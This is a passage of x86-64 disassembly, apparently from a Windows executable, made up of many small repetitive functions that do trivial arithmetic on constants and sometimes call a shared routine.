   1400015e7:	41 54                	push   %r12
   1400015e9:	41 55                	push   %r13
   1400015eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400015ef:	6a 06                	push   $0x6
   1400015f1:	58                   	pop    %rax
   1400015f2:	50                   	push   %rax
   1400015f3:	5b                   	pop    %rbx
   1400015f4:	48 83 c4 20          	add    $0x20,%rsp
   1400015f8:	41 5d                	pop    %r13
   1400015fa:	41 5c                	pop    %r12
   1400015fc:	5f                   	pop    %rdi
   1400015fd:	5e                   	pop    %rsi
   1400015fe:	5b                   	pop    %rbx
   1400015ff:	c3                   	ret
   140001600:	53                   	push   %rbx
   140001601:	56                   	push   %rsi
   140001602:	57                   	push   %rdi
   140001603:	41 54                	push   %r12
   140001605:	41 55                	push   %r13
   140001607:	48 83 ec 20          	sub    $0x20,%rsp
   14000160b:	b8 36 00 00 00       	mov    $0x36,%eax
   140001610:	bb 25 00 00 00       	mov    $0x25,%ebx
   140001615:	21 d8                	and    %ebx,%eax
   140001617:	83 cb 0f             	or     $0xf,%ebx
   14000161a:	48 83 c4 20          	add    $0x20,%rsp
   14000161e:	41 5d                	pop    %r13
   140001620:	41 5c                	pop    %r12
   140001622:	5f                   	pop    %rdi
   140001623:	5e                   	pop    %rsi
   140001624:	5b                   	pop    %rbx
   140001625:	c3                   	ret
   140001626:	53                   	push   %rbx
   140001627:	56                   	push   %rsi
   140001628:	57                   	push   %rdi
   140001629:	41 54                	push   %r12
   14000162b:	41 55                	push   %r13
   14000162d:	48 83 ec 20          	sub    $0x20,%rsp
   140001631:	b8 10 00 00 00       	mov    $0x10,%eax
   140001636:	bb 12 00 00 00       	mov    $0x12,%ebx
   14000163b:	b9 10 00 00 00       	mov    $0x10,%ecx
   140001640:	01 d8                	add    %ebx,%eax
   140001642:	29 c1                	sub    %eax,%ecx
   140001644:	48 83 c4 20          	add    $0x20,%rsp
   140001648:	41 5d                	pop    %r13
   14000164a:	41 5c                	pop    %r12
   14000164c:	5f                   	pop    %rdi
   14000164d:	5e                   	pop    %rsi
   14000164e:	5b                   	pop    %rbx
   14000164f:	c3                   	ret
   140001650:	53                   	push   %rbx
   140001651:	56                   	push   %rsi
   140001652:	57                   	push   %rdi
   140001653:	41 54                	push   %r12
   140001655:	41 55                	push   %r13
   140001657:	48 83 ec 20          	sub    $0x20,%rsp
   14000165b:	b8 02 00 00 00       	mov    $0x2,%eax
   140001660:	83 c0 02             	add    $0x2,%eax
   140001663:	d1 e0                	shl    $1,%eax
   140001665:	83 f8 0a             	cmp    $0xa,%eax
   140001668:	7c 03                	jl     0x14000166d
   14000166a:	83 e8 05             	sub    $0x5,%eax
   14000166d:	48 83 c4 20          	add    $0x20,%rsp
   140001671:	41 5d                	pop    %r13
   140001673:	41 5c                	pop    %r12
   140001675:	5f                   	pop    %rdi
   140001676:	5e                   	pop    %rsi
   140001677:	5b                   	pop    %rbx
   140001678:	c3                   	ret
   140001679:	53                   	push   %rbx
   14000167a:	56                   	push   %rsi
   14000167b:	57                   	push   %rdi
   14000167c:	41 54                	push   %r12
   14000167e:	41 55                	push   %r13
   140001680:	48 83 ec 20          	sub    $0x20,%rsp
   140001684:	e8 d1 f9 ff ff       	call   0x14000105a
   140001689:	25 ff 00 00 00       	and    $0xff,%eax
   14000168e:	6a 10                	push   $0x10
   140001690:	6a 5a                	push   $0x5a
   140001692:	58                   	pop    %rax
   140001693:	5b                   	pop    %rbx
   140001694:	48 01 d8             	add    %rbx,%rax
   140001697:	48 83 c4 20          	add    $0x20,%rsp
   14000169b:	41 5d                	pop    %r13
   14000169d:	41 5c                	pop    %r12
   14000169f:	5f                   	pop    %rdi
   1400016a0:	5e                   	pop    %rsi
   1400016a1:	5b                   	pop    %rbx
   1400016a2:	c3                   	ret
   1400016a3:	53                   	push   %rbx
   1400016a4:	56                   	push   %rsi
   1400016a5:	57                   	push   %rdi
   1400016a6:	41 54                	push   %r12
   1400016a8:	41 55                	push   %r13
   1400016aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400016ae:	6a 39                	push   $0x39
   1400016b0:	6a 12                	push   $0x12
   1400016b2:	58                   	pop    %rax
   1400016b3:	5b                   	pop    %rbx
   1400016b4:	48 83 c4 20          	add    $0x20,%rsp
   1400016b8:	41 5d                	pop    %r13
   1400016ba:	41 5c                	pop    %r12
   1400016bc:	5f                   	pop    %rdi
   1400016bd:	5e                   	pop    %rsi
   1400016be:	5b                   	pop    %rbx
   1400016bf:	c3                   	ret
   1400016c0:	53                   	push   %rbx
   1400016c1:	56                   	push   %rsi
   1400016c2:	57                   	push   %rdi
   1400016c3:	41 54                	push   %r12
   1400016c5:	41 55                	push   %r13
   1400016c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400016cb:	e8 8a f9 ff ff       	call   0x14000105a
   1400016d0:	25 ff 00 00 00       	and    $0xff,%eax
   1400016d5:	b8 33 00 00 00       	mov    $0x33,%eax
   1400016da:	bb 23 00 00 00       	mov    $0x23,%ebx
   1400016df:	01 d8                	add    %ebx,%eax
   1400016e1:	89 c1                	mov    %eax,%ecx
   1400016e3:	01 cb                	add    %ecx,%ebx
   1400016e5:	48 83 c4 20          	add    $0x20,%rsp
   1400016e9:	41 5d                	pop    %r13
   1400016eb:	41 5c                	pop    %r12
   1400016ed:	5f                   	pop    %rdi
   1400016ee:	5e                   	pop    %rsi
   1400016ef:	5b                   	pop    %rbx
   1400016f0:	c3                   	ret
   1400016f1:	53                   	push   %rbx
   1400016f2:	56                   	push   %rsi
   1400016f3:	57                   	push   %rdi
   1400016f4:	41 54                	push   %r12
   1400016f6:	41 55                	push   %r13
   1400016f8:	48 83 ec 20          	sub    $0x20,%rsp
   1400016fc:	e8 59 f9 ff ff       	call   0x14000105a
   140001701:	25 ff 00 00 00       	and    $0xff,%eax
   140001706:	b8 48 00 00 00       	mov    $0x48,%eax
   14000170b:	6b c0 2d             	imul   $0x2d,%eax,%eax
   14000170e:	83 c0 08             	add    $0x8,%eax
   140001711:	83 e8 0d             	sub    $0xd,%eax
   140001714:	f7 d8                	neg    %eax
   140001716:	48 83 c4 20          	add    $0x20,%rsp
   14000171a:	41 5d                	pop    %r13
   14000171c:	41 5c                	pop    %r12
   14000171e:	5f                   	pop    %rdi
   14000171f:	5e                   	pop    %rsi
   140001720:	5b                   	pop    %rbx
   140001721:	c3                   	ret
   140001722:	53                   	push   %rbx
   140001723:	56                   	push   %rsi
   140001724:	57                   	push   %rdi
   140001725:	41 54                	push   %r12
   140001727:	41 55                	push   %r13
   140001729:	48 83 ec 20          	sub    $0x20,%rsp
   14000172d:	e8 28 f9 ff ff       	call   0x14000105a
   140001732:	25 ff 00 00 00       	and    $0xff,%eax
   140001737:	b8 46 00 00 00       	mov    $0x46,%eax
   14000173c:	6b c0 17             	imul   $0x17,%eax,%eax
   14000173f:	83 c0 10             	add    $0x10,%eax
   140001742:	83 e8 07             	sub    $0x7,%eax
   140001745:	f7 d8                	neg    %eax
   140001747:	48 83 c4 20          	add    $0x20,%rsp
   14000174b:	41 5d                	pop    %r13
   14000174d:	41 5c                	pop    %r12
   14000174f:	5f                   	pop    %rdi
   140001750:	5e                   	pop    %rsi
   140001751:	5b                   	pop    %rbx
   140001752:	c3                   	ret
   140001753:	53                   	push   %rbx
   140001754:	56                   	push   %rsi
   140001755:	57                   	push   %rdi
   140001756:	41 54                	push   %r12
   140001758:	41 55                	push   %r13
   14000175a:	48 83 ec 20          	sub    $0x20,%rsp
   14000175e:	b8 3b 00 00 00       	mov    $0x3b,%eax
   140001763:	83 c0 23             	add    $0x23,%eax
   140001766:	72 05                	jb     0x14000176d
   140001768:	83 c0 05             	add    $0x5,%eax
   14000176b:	eb 03                	jmp    0x140001770
   14000176d:	83 c0 0a             	add    $0xa,%eax
   140001770:	48 83 c4 20          	add    $0x20,%rsp
   140001774:	41 5d                	pop    %r13
   140001776:	41 5c                	pop    %r12
   140001778:	5f                   	pop    %rdi
   140001779:	5e                   	pop    %rsi
   14000177a:	5b                   	pop    %rbx
   14000177b:	c3                   	ret
   14000177c:	53                   	push   %rbx
   14000177d:	56                   	push   %rsi
   14000177e:	57                   	push   %rdi
   14000177f:	41 54                	push   %r12
   140001781:	41 55                	push   %r13
   140001783:	48 83 ec 20          	sub    $0x20,%rsp
   140001787:	e8 ce f8 ff ff       	call   0x14000105a
   14000178c:	25 ff 00 00 00       	and    $0xff,%eax
   140001791:	b8 56 00 00 00       	mov    $0x56,%eax
   140001796:	83 c0 2b             	add    $0x2b,%eax
   140001799:	83 c0 0c             	add    $0xc,%eax
   14000179c:	83 c0 04             	add    $0x4,%eax
   14000179f:	48 83 c4 20          	add    $0x20,%rsp
   1400017a3:	41 5d                	pop    %r13
   1400017a5:	41 5c                	pop    %r12
   1400017a7:	5f                   	pop    %rdi
   1400017a8:	5e                   	pop    %rsi
   1400017a9:	5b                   	pop    %rbx
   1400017aa:	c3                   	ret
   1400017ab:	53                   	push   %rbx
   1400017ac:	56                   	push   %rsi
   1400017ad:	57                   	push   %rdi
   1400017ae:	41 54                	push   %r12
   1400017b0:	41 55                	push   %r13
   1400017b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400017b6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017bb:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400017c0:	d1 e0                	shl    $1,%eax
   1400017c2:	ff c9                	dec    %ecx
   1400017c4:	75 fa                	jne    0x1400017c0
   1400017c6:	48 83 c4 20          	add    $0x20,%rsp
   1400017ca:	41 5d                	pop    %r13
   1400017cc:	41 5c                	pop    %r12
   1400017ce:	5f                   	pop    %rdi
   1400017cf:	5e                   	pop    %rsi
   1400017d0:	5b                   	pop    %rbx
   1400017d1:	c3                   	ret
   1400017d2:	53                   	push   %rbx
   1400017d3:	56                   	push   %rsi
   1400017d4:	57                   	push   %rdi
   1400017d5:	41 54                	push   %r12
   1400017d7:	41 55                	push   %r13
   1400017d9:	48 83 ec 20          	sub    $0x20,%rsp
   1400017dd:	b8 03 00 00 00       	mov    $0x3,%eax
   1400017e2:	bb 0e 00 00 00       	mov    $0xe,%ebx
   1400017e7:	39 d8                	cmp    %ebx,%eax
   1400017e9:	7f 04                	jg     0x1400017ef
   1400017eb:	89 c1                	mov    %eax,%ecx
   1400017ed:	eb 02                	jmp    0x1400017f1
   1400017ef:	89 d9                	mov    %ebx,%ecx
   1400017f1:	01 c8                	add    %ecx,%eax
   1400017f3:	48 83 c4 20          	add    $0x20,%rsp
   1400017f7:	41 5d                	pop    %r13
   1400017f9:	41 5c                	pop    %r12
   1400017fb:	5f                   	pop    %rdi
   1400017fc:	5e                   	pop    %rsi
   1400017fd:	5b                   	pop    %rbx
   1400017fe:	c3                   	ret
   1400017ff:	53                   	push   %rbx
   140001800:	56                   	push   %rsi
   140001801:	57                   	push   %rdi
   140001802:	41 54                	push   %r12
   140001804:	41 55                	push   %r13
   140001806:	48 83 ec 20          	sub    $0x20,%rsp
   14000180a:	b8 5a 00 00 00       	mov    $0x5a,%eax
   14000180f:	bb 18 00 00 00       	mov    $0x18,%ebx
   140001814:	01 d8                	add    %ebx,%eax
   140001816:	89 c1                	mov    %eax,%ecx
   140001818:	01 cb                	add    %ecx,%ebx
   14000181a:	48 83 c4 20          	add    $0x20,%rsp
   14000181e:	41 5d                	pop    %r13
   140001820:	41 5c                	pop    %r12
   140001822:	5f                   	pop    %rdi
   140001823:	5e                   	pop    %rsi
   140001824:	5b                   	pop    %rbx
   140001825:	c3                   	ret
   140001826:	53                   	push   %rbx
   140001827:	56                   	push   %rsi
   140001828:	57                   	push   %rdi
   140001829:	41 54                	push   %r12
   14000182b:	41 55                	push   %r13
   14000182d:	48 83 ec 20          	sub    $0x20,%rsp
   140001831:	b8 63 00 00 00       	mov    $0x63,%eax
   140001836:	bb 0c 00 00 00       	mov    $0xc,%ebx
   14000183b:	01 d8                	add    %ebx,%eax
   14000183d:	d1 e0                	shl    $1,%eax
   14000183f:	48 83 c4 20          	add    $0x20,%rsp
   140001843:	41 5d                	pop    %r13
   140001845:	41 5c                	pop    %r12
   140001847:	5f                   	pop    %rdi
   140001848:	5e                   	pop    %rsi
   140001849:	5b                   	pop    %rbx
   14000184a:	c3                   	ret
   14000184b:	53                   	push   %rbx
   14000184c:	56                   	push   %rsi
   14000184d:	57                   	push   %rdi
   14000184e:	41 54                	push   %r12
   140001850:	41 55                	push   %r13
   140001852:	48 83 ec 20          	sub    $0x20,%rsp
   140001856:	b8 0c 00 00 00       	mov    $0xc,%eax
   14000185b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001860:	31 d2                	xor    %edx,%edx
   140001862:	f7 f1                	div    %ecx
   140001864:	48 83 c4 20          	add    $0x20,%rsp
   140001868:	41 5d                	pop    %r13
   14000186a:	41 5c                	pop    %r12
   14000186c:	5f                   	pop    %rdi
   14000186d:	5e                   	pop    %rsi
   14000186e:	5b                   	pop    %rbx
   14000186f:	c3                   	ret
   140001870:	53                   	push   %rbx
   140001871:	56                   	push   %rsi
   140001872:	57                   	push   %rdi
   140001873:	41 54                	push   %r12
   140001875:	41 55                	push   %r13
   140001877:	48 83 ec 20          	sub    $0x20,%rsp
   14000187b:	e8 da f7 ff ff       	call   0x14000105a
   140001880:	25 ff 00 00 00       	and    $0xff,%eax
   140001885:	b8 46 00 00 00       	mov    $0x46,%eax
   14000188a:	bb 0a 00 00 00       	mov    $0xa,%ebx
   14000188f:	01 d8                	add    %ebx,%eax
   140001891:	89 c1                	mov    %eax,%ecx
   140001893:	01 cb                	add    %ecx,%ebx
   140001895:	48 83 c4 20          	add    $0x20,%rsp
   140001899:	41 5d                	pop    %r13
   14000189b:	41 5c                	pop    %r12
   14000189d:	5f                   	pop    %rdi
   14000189e:	5e                   	pop    %rsi
   14000189f:	5b                   	pop    %rbx
   1400018a0:	c3                   	ret
   1400018a1:	53                   	push   %rbx
   1400018a2:	56                   	push   %rsi
   1400018a3:	57                   	push   %rdi
   1400018a4:	41 54                	push   %r12
   1400018a6:	41 55                	push   %r13
   1400018a8:	48 83 ec 20          	sub    $0x20,%rsp
   1400018ac:	b8 01 00 00 00       	mov    $0x1,%eax
   1400018b1:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400018b6:	0f af c1             	imul   %ecx,%eax
   1400018b9:	ff c9                	dec    %ecx
   1400018bb:	75 f9                	jne    0x1400018b6
   1400018bd:	48 83 c4 20          	add    $0x20,%rsp
   1400018c1:	41 5d                	pop    %r13
   1400018c3:	41 5c                	pop    %r12
   1400018c5:	5f                   	pop    %rdi
   1400018c6:	5e                   	pop    %rsi
   1400018c7:	5b                   	pop    %rbx
   1400018c8:	c3                   	ret
   1400018c9:	53                   	push   %rbx
   1400018ca:	56                   	push   %rsi
   1400018cb:	57                   	push   %rdi
   1400018cc:	41 54                	push   %r12
   1400018ce:	41 55                	push   %r13
   1400018d0:	48 83 ec 20          	sub    $0x20,%rsp
   1400018d4:	48 c7 c0 2b 00 00 00 	mov    $0x2b,%rax
   1400018db:	50                   	push   %rax
   1400018dc:	5b                   	pop    %rbx
   1400018dd:	48 83 c3 05          	add    $0x5,%rbx
   1400018e1:	48 83 c4 20          	add    $0x20,%rsp
   1400018e5:	41 5d                	pop    %r13
   1400018e7:	41 5c                	pop    %r12
   1400018e9:	5f                   	pop    %rdi
   1400018ea:	5e                   	pop    %rsi
   1400018eb:	5b                   	pop    %rbx
   1400018ec:	c3                   	ret
   1400018ed:	53                   	push   %rbx
   1400018ee:	56                   	push   %rsi
   1400018ef:	57                   	push   %rdi
   1400018f0:	41 54                	push   %r12
   1400018f2:	41 55                	push   %r13
   1400018f4:	48 83 ec 20          	sub    $0x20,%rsp
   1400018f8:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400018fd:	31 c0                	xor    %eax,%eax
   1400018ff:	83 c0 01             	add    $0x1,%eax
   140001902:	ff c9                	dec    %ecx
   140001904:	75 f9                	jne    0x1400018ff
   140001906:	48 83 c4 20          	add    $0x20,%rsp
   14000190a:	41 5d                	pop    %r13
   14000190c:	41 5c                	pop    %r12
   14000190e:	5f                   	pop    %rdi
   14000190f:	5e                   	pop    %rsi
   140001910:	5b                   	pop    %rbx
   140001911:	c3                   	ret
   140001912:	53                   	push   %rbx
   140001913:	56                   	push   %rsi
   140001914:	57                   	push   %rdi
   140001915:	41 54                	push   %r12
   140001917:	41 55                	push   %r13
   140001919:	48 83 ec 20          	sub    $0x20,%rsp
   14000191d:	6a 2c                	push   $0x2c
   14000191f:	6a 0a                	push   $0xa
   140001921:	58                   	pop    %rax
   140001922:	5b                   	pop    %rbx
   140001923:	48 0f af c3          	imul   %rbx,%rax
   140001927:	48 83 c4 20          	add    $0x20,%rsp
   14000192b:	41 5d                	pop    %r13
   14000192d:	41 5c                	pop    %r12
   14000192f:	5f                   	pop    %rdi
   140001930:	5e                   	pop    %rsi
   140001931:	5b                   	pop    %rbx
   140001932:	c3                   	ret
   140001933:	53                   	push   %rbx
   140001934:	56                   	push   %rsi
   140001935:	57                   	push   %rdi
   140001936:	41 54                	push   %r12
   140001938:	41 55                	push   %r13
   14000193a:	48 83 ec 20          	sub    $0x20,%rsp
   14000193e:	b8 39 00 00 00       	mov    $0x39,%eax
   140001943:	bb 11 00 00 00       	mov    $0x11,%ebx
   140001948:	b9 0a 00 00 00       	mov    $0xa,%ecx
   14000194d:	01 d8                	add    %ebx,%eax
   14000194f:	29 c1                	sub    %eax,%ecx
   140001951:	48 83 c4 20          	add    $0x20,%rsp
   140001955:	41 5d                	pop    %r13
   140001957:	41 5c                	pop    %r12
   140001959:	5f                   	pop    %rdi
   14000195a:	5e                   	pop    %rsi
   14000195b:	5b                   	pop    %rbx
   14000195c:	c3                   	ret
   14000195d:	53                   	push   %rbx
   14000195e:	56                   	push   %rsi
   14000195f:	57                   	push   %rdi
   140001960:	41 54                	push   %r12
   140001962:	41 55                	push   %r13
   140001964:	48 83 ec 20          	sub    $0x20,%rsp
   140001968:	6a 05                	push   $0x5
   14000196a:	58                   	pop    %rax
   14000196b:	50                   	push   %rax
   14000196c:	5b                   	pop    %rbx
   14000196d:	48 83 c4 20          	add    $0x20,%rsp
   140001971:	41 5d                	pop    %r13
   140001973:	41 5c                	pop    %r12
   140001975:	5f                   	pop    %rdi
   140001976:	5e                   	pop    %rsi
   140001977:	5b                   	pop    %rbx
   140001978:	c3                   	ret
   140001979:	53                   	push   %rbx
   14000197a:	56                   	push   %rsi
   14000197b:	57                   	push   %rdi
   14000197c:	41 54                	push   %r12
   14000197e:	41 55                	push   %r13
   140001980:	48 83 ec 20          	sub    $0x20,%rsp
   140001984:	e8 d1 f6 ff ff       	call   0x14000105a
   140001989:	25 ff 00 00 00       	and    $0xff,%eax
   14000198e:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001993:	a9 01 00 00 00       	test   $0x1,%eax
   140001998:	74 05                	je     0x14000199f
   14000199a:	83 c0 0a             	add    $0xa,%eax
   14000199d:	eb 03                	jmp    0x1400019a2
   14000199f:	83 e8 05             	sub    $0x5,%eax
   1400019a2:	48 83 c4 20          	add    $0x20,%rsp
   1400019a6:	41 5d                	pop    %r13
   1400019a8:	41 5c                	pop    %r12
   1400019aa:	5f                   	pop    %rdi
   1400019ab:	5e                   	pop    %rsi
   1400019ac:	5b                   	pop    %rbx
   1400019ad:	c3                   	ret
   1400019ae:	53                   	push   %rbx
   1400019af:	56                   	push   %rsi
   1400019b0:	57                   	push   %rdi
   1400019b1:	41 54                	push   %r12
   1400019b3:	41 55                	push   %r13
   1400019b5:	48 83 ec 20          	sub    $0x20,%rsp
   1400019b9:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   1400019c0:	48 8d 58 01          	lea    0x1(%rax),%rbx
   1400019c4:	48 01 d8             	add    %rbx,%rax
   1400019c7:	48 83 c4 20          	add    $0x20,%rsp
   1400019cb:	41 5d                	pop    %r13
   1400019cd:	41 5c                	pop    %r12
   1400019cf:	5f                   	pop    %rdi
   1400019d0:	5e                   	pop    %rsi
   1400019d1:	5b                   	pop    %rbx
   1400019d2:	c3                   	ret
   1400019d3:	53                   	push   %rbx
   1400019d4:	56                   	push   %rsi
   1400019d5:	57                   	push   %rdi
   1400019d6:	41 54                	push   %r12
   1400019d8:	41 55                	push   %r13
   1400019da:	48 83 ec 20          	sub    $0x20,%rsp
   1400019de:	b8 07 00 00 00       	mov    $0x7,%eax
   1400019e3:	bb 27 00 00 00       	mov    $0x27,%ebx
   1400019e8:	b9 11 00 00 00       	mov    $0x11,%ecx
   1400019ed:	01 d8                	add    %ebx,%eax
   1400019ef:	29 c1                	sub    %eax,%ecx
   1400019f1:	48 83 c4 20          	add    $0x20,%rsp
   1400019f5:	41 5d                	pop    %r13
   1400019f7:	41 5c                	pop    %r12
   1400019f9:	5f                   	pop    %rdi
   1400019fa:	5e                   	pop    %rsi
   1400019fb:	5b                   	pop    %rbx
   1400019fc:	c3                   	ret
   1400019fd:	53                   	push   %rbx
   1400019fe:	56                   	push   %rsi
   1400019ff:	57                   	push   %rdi
   140001a00:	41 54                	push   %r12
   140001a02:	41 55                	push   %r13
   140001a04:	48 83 ec 20          	sub    $0x20,%rsp
   140001a08:	b8 87 00 00 00       	mov    $0x87,%eax
   140001a0d:	83 e0 01             	and    $0x1,%eax
   140001a10:	74 03                	je     0x140001a15
   140001a12:	83 c0 0a             	add    $0xa,%eax
   140001a15:	48 83 c4 20          	add    $0x20,%rsp
   140001a19:	41 5d                	pop    %r13
   140001a1b:	41 5c                	pop    %r12
   140001a1d:	5f                   	pop    %rdi
   140001a1e:	5e                   	pop    %rsi
   140001a1f:	5b                   	pop    %rbx
   140001a20:	c3                   	ret
   140001a21:	53                   	push   %rbx
   140001a22:	56                   	push   %rsi
   140001a23:	57                   	push   %rdi
   140001a24:	41 54                	push   %r12
   140001a26:	41 55                	push   %r13
   140001a28:	48 83 ec 20          	sub    $0x20,%rsp
   140001a2c:	e8 29 f6 ff ff       	call   0x14000105a
   140001a31:	25 ff 00 00 00       	and    $0xff,%eax
   140001a36:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001a3b:	31 c0                	xor    %eax,%eax
   140001a3d:	83 c0 01             	add    $0x1,%eax
   140001a40:	ff c9                	dec    %ecx
   140001a42:	75 f9                	jne    0x140001a3d
   140001a44:	48 83 c4 20          	add    $0x20,%rsp
   140001a48:	41 5d                	pop    %r13
   140001a4a:	41 5c                	pop    %r12
   140001a4c:	5f                   	pop    %rdi
   140001a4d:	5e                   	pop    %rsi
   140001a4e:	5b                   	pop    %rbx
   140001a4f:	c3                   	ret
   140001a50:	53                   	push   %rbx
   140001a51:	56                   	push   %rsi
   140001a52:	57                   	push   %rdi
   140001a53:	41 54                	push   %r12
   140001a55:	41 55                	push   %r13
   140001a57:	48 83 ec 20          	sub    $0x20,%rsp
   140001a5b:	b8 09 00 00 00       	mov    $0x9,%eax
   140001a60:	83 e0 04             	and    $0x4,%eax
   140001a63:	74 03                	je     0x140001a68
   140001a65:	83 c0 0a             	add    $0xa,%eax
   140001a68:	48 83 c4 20          	add    $0x20,%rsp
   140001a6c:	41 5d                	pop    %r13
   140001a6e:	41 5c                	pop    %r12
   140001a70:	5f                   	pop    %rdi
   140001a71:	5e                   	pop    %rsi
   140001a72:	5b                   	pop    %rbx
   140001a73:	c3                   	ret
   140001a74:	53                   	push   %rbx
   140001a75:	56                   	push   %rsi
   140001a76:	57                   	push   %rdi
   140001a77:	41 54                	push   %r12
   140001a79:	41 55                	push   %r13
   140001a7b:	48 83 ec 20          	sub    $0x20,%rsp
   140001a7f:	e8 d6 f5 ff ff       	call   0x14000105a
   140001a84:	25 ff 00 00 00       	and    $0xff,%eax
   140001a89:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
   140001a90:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140001a94:	48 01 d8             	add    %rbx,%rax
   140001a97:	48 83 c4 20          	add    $0x20,%rsp
   140001a9b:	41 5d                	pop    %r13
   140001a9d:	41 5c                	pop    %r12
   140001a9f:	5f                   	pop    %rdi
   140001aa0:	5e                   	pop    %rsi
   140001aa1:	5b                   	pop    %rbx
   140001aa2:	c3                   	ret
   140001aa3:	53                   	push   %rbx
   140001aa4:	56                   	push   %rsi
   140001aa5:	57                   	push   %rdi
   140001aa6:	41 54                	push   %r12
   140001aa8:	41 55                	push   %r13
   140001aaa:	48 83 ec 20          	sub    $0x20,%rsp
   140001aae:	b8 f6 00 00 00       	mov    $0xf6,%eax
   140001ab3:	d1 e8                	shr    $1,%eax
   140001ab5:	72 05                	jb     0x140001abc
   140001ab7:	c1 e0 02             	shl    $0x2,%eax
   140001aba:	eb 02                	jmp    0x140001abe
   140001abc:	d1 e0                	shl    $1,%eax
   140001abe:	48 83 c4 20          	add    $0x20,%rsp
   140001ac2:	41 5d                	pop    %r13
   140001ac4:	41 5c                	pop    %r12
   140001ac6:	5f                   	pop    %rdi
   140001ac7:	5e                   	pop    %rsi
   140001ac8:	5b                   	pop    %rbx
   140001ac9:	c3                   	ret
   140001aca:	53                   	push   %rbx
   140001acb:	56                   	push   %rsi
   140001acc:	57                   	push   %rdi
   140001acd:	41 54                	push   %r12
   140001acf:	41 55                	push   %r13
   140001ad1:	48 83 ec 20          	sub    $0x20,%rsp
   140001ad5:	b8 12 00 00 00       	mov    $0x12,%eax
   140001ada:	bb 3f 00 00 00       	mov    $0x3f,%ebx
   140001adf:	39 d8                	cmp    %ebx,%eax
   140001ae1:	7f 04                	jg     0x140001ae7
   140001ae3:	01 d8                	add    %ebx,%eax
   140001ae5:	eb 02                	jmp    0x140001ae9
   140001ae7:	29 d8                	sub    %ebx,%eax
   140001ae9:	48 83 c4 20          	add    $0x20,%rsp
   140001aed:	41 5d                	pop    %r13
   140001aef:	41 5c                	pop    %r12
   140001af1:	5f                   	pop    %rdi
   140001af2:	5e                   	pop    %rsi
   140001af3:	5b                   	pop    %rbx
   140001af4:	c3                   	ret
   140001af5:	53                   	push   %rbx
   140001af6:	56                   	push   %rsi
   140001af7:	57                   	push   %rdi
   140001af8:	41 54                	push   %r12
   140001afa:	41 55                	push   %r13
   140001afc:	48 83 ec 20          	sub    $0x20,%rsp
   140001b00:	b8 20 00 00 00       	mov    $0x20,%eax
   140001b05:	bb 02 00 00 00       	mov    $0x2,%ebx
   140001b0a:	01 d8                	add    %ebx,%eax
   140001b0c:	d1 e0                	shl    $1,%eax
   140001b0e:	48 83 c4 20          	add    $0x20,%rsp
   140001b12:	41 5d                	pop    %r13
   140001b14:	41 5c                	pop    %r12
   140001b16:	5f                   	pop    %rdi
   140001b17:	5e                   	pop    %rsi
   140001b18:	5b                   	pop    %rbx
   140001b19:	c3                   	ret
   140001b1a:	53                   	push   %rbx
   140001b1b:	56                   	push   %rsi
   140001b1c:	57                   	push   %rdi
   140001b1d:	41 54                	push   %r12
   140001b1f:	41 55                	push   %r13
   140001b21:	48 83 ec 20          	sub    $0x20,%rsp
   140001b25:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   140001b2c:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140001b30:	48 01 d8             	add    %rbx,%rax
   140001b33:	48 83 c4 20          	add    $0x20,%rsp
   140001b37:	41 5d                	pop    %r13
   140001b39:	41 5c                	pop    %r12
   140001b3b:	5f                   	pop    %rdi
   140001b3c:	5e                   	pop    %rsi
   140001b3d:	5b                   	pop    %rbx
   140001b3e:	c3                   	ret
   140001b3f:	53                   	push   %rbx
   140001b40:	56                   	push   %rsi
   140001b41:	57                   	push   %rdi
   140001b42:	41 54                	push   %r12
   140001b44:	41 55                	push   %r13
   140001b46:	48 83 ec 20          	sub    $0x20,%rsp
   140001b4a:	e8 0b f5 ff ff       	call   0x14000105a
   140001b4f:	25 ff 00 00 00       	and    $0xff,%eax
   140001b54:	b8 03 00 00 00       	mov    $0x3,%eax
   140001b59:	83 c0 03             	add    $0x3,%eax
   140001b5c:	d1 e0                	shl    $1,%eax
   140001b5e:	83 f8 0a             	cmp    $0xa,%eax
   140001b61:	7c 03                	jl     0x140001b66
   140001b63:	83 e8 05             	sub    $0x5,%eax
   140001b66:	48 83 c4 20          	add    $0x20,%rsp
   140001b6a:	41 5d                	pop    %r13
   140001b6c:	41 5c                	pop    %r12
   140001b6e:	5f                   	pop    %rdi
   140001b6f:	5e                   	pop    %rsi
   140001b70:	5b                   	pop    %rbx
   140001b71:	c3                   	ret
   140001b72:	53                   	push   %rbx
   140001b73:	56                   	push   %rsi
   140001b74:	57                   	push   %rdi
   140001b75:	41 54                	push   %r12
   140001b77:	41 55                	push   %r13
   140001b79:	48 83 ec 20          	sub    $0x20,%rsp
   140001b7d:	b8 2a 00 00 00       	mov    $0x2a,%eax
   140001b82:	6b c0 02             	imul   $0x2,%eax,%eax
   140001b85:	83 c0 2e             	add    $0x2e,%eax
   140001b88:	6b c0 03             	imul   $0x3,%eax,%eax
   140001b8b:	48 83 c4 20          	add    $0x20,%rsp
   140001b8f:	41 5d                	pop    %r13
   140001b91:	41 5c                	pop    %r12
   140001b93:	5f                   	pop    %rdi
   140001b94:	5e                   	pop    %rsi
   140001b95:	5b                   	pop    %rbx
   140001b96:	c3                   	ret
   140001b97:	53                   	push   %rbx
   140001b98:	56                   	push   %rsi
   140001b99:	57                   	push   %rdi
   140001b9a:	41 54                	push   %r12
   140001b9c:	41 55                	push   %r13
   140001b9e:	48 83 ec 20          	sub    $0x20,%rsp
   140001ba2:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001ba7:	31 c0                	xor    %eax,%eax
   140001ba9:	83 c0 02             	add    $0x2,%eax
   140001bac:	ff c9                	dec    %ecx
   140001bae:	75 f9                	jne    0x140001ba9
   140001bb0:	48 83 c4 20          	add    $0x20,%rsp
